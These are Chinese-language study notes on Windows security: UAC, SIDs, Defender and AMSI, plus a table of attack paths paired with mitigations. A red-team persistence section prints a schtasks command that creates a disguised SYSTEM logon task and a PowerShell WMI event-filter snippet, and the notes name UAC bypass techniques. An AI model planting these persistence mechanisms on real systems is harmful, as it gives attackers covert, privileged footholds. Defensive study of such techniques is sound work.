# Windows 安全机制

## 安全核心组件

### 用户账户控制（UAC）
- 管理员账户默认以标准用户令牌运行
- 需要提升权限时弹出确认对话框
- 绕过方法：BypassUAC 技术（CMSTP、FodHelper）

### 安全标识符（SID）
- S-1-5-18：SYSTEM
- S-1-5-32-544：Administrators
- S-1-5-11：Authenticated Users

### Windows Defender
- 实时保护 + 云保护
- AMSI：反恶意软件扫描接口
- 攻击面减少（ASR）规则

## 常见攻击路径

| 攻击类型 | 利用方法 | 缓解措施 |
|---------|---------|---------|
| 令牌窃取 | Incognito/Tokens | 最小权限 + Protected Process |
| 服务劫持 | Unquoted Service Path | 路径引号规范 |
| DLL 劫持 | 搜索顺序劫持 | Safe DLL Search Mode |
| 注册表持久化 | Run/RunOnce | EDR 监控 |

## 红队视角的 Windows 持久化

### 计划任务
```powershell
schtasks /create /tn "UpdateTask" /tr "powershell.exe -Command Start-Process cmd" /sc onlogon /ru SYSTEM
```

### WMI 事件订阅
```powershell
$filter = ([WMICLASS]"\\.\root\subscription:__EventFilter").CreateInstance()
$filter.QueryLanguage = "WQL"
$filter.Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.Name = '_Total' AND (TargetInstance.PagesPerSec > 0)"
$filter.Name = "Persistence"
$filter.Put()
```
